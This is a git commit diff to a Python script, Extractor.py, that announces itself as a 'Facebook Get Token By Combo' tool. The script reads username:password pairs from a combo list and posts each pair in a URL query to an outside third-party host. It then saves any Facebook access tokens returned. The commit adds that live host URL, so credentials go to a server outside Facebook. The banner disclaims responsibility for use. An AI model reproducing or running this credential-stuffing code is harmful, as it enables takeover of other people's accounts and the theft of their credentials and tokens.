42bf8b5e0a6db2727442ea740c2b9c35f3626b08
Ahmed Gad <34446175+xXBandoXx201@users.noreply.github.com>
2018-04-28 22:09:40 +0200

    Update Extractor.py

--- Extractor.py
+++ Extractor.py
@@ -5,18 +5,20 @@ import requests, json
 import os
 gad ="[+]Facebook Get Token By Combo [+]\n[+]Coded: @Gad990   (Telegram)[+]\n Date: 26/01/2018 \n[+]Changing the Description of this tool Won't made you the coder ^_^[+]\n[+]I take no responsibilities for the use of this program[+] "
 print(gad)
-file_save = input('Name Of File Save Toke >>') +'.txt'
-combo = input('Enter Combo text File >>')+'.txt'
+file_save = input('Name Of File Save Token >>')
+combo = input('Enter Combo text File >>')
 var = open(combo, 'r').readlines()
 for line in var:
 	combo = line.strip()
 	user, pas =line.split(":")
-	url = 'api'
+	url = 'http://apifbgad-com.stackstaging.com/gado.php?u='+user+'&p='+pas+''
 	http = requests.post(url)
 	content = http.content
 	data = json.loads(content.decode("utf-8"))
 	if "session_key" in data:
                 print(data["access_token"])
-                the_file = open(file_save, 'w')
+                the_file = open(file_save, 'a')
                 the_file.write(data["access_token"] + '\n')
                 the_file.close()
+	elif "error_code" in data:
+		print(data["error_msg"])
